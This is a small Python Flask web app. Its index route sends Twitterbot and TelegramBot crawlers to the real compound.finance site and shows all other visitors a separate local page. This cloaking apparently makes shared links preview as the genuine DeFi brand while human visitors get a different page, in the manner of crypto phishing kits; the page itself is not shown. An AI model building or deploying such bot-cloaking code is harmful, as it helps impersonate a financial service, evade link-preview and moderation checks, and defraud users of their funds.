from flask import Flask, abort, redirect, request, render_template, send_from_directory
import os

app = Flask(__name__)

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent').strip('\r\n')
    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://compound.finance/')
    else:
        return render_template('index.html')

@app.route('/styles/<path:filename>')
def serve_styles(filename):
    return send_from_directory(os.path.join(app.root_path, 'styles'), filename)

@app.route('/scripts/<path:filename>')
def serve_scripts(filename):
    return send_from_directory(os.path.join(app.root_path, 'scripts'), filename)

@app.route('/images/<path:filename>')
def serve_images(filename):
    return send_from_directory(os.path.join(app.root_path, 'images'), filename)

if __name__ == '__main__':
  app.run()
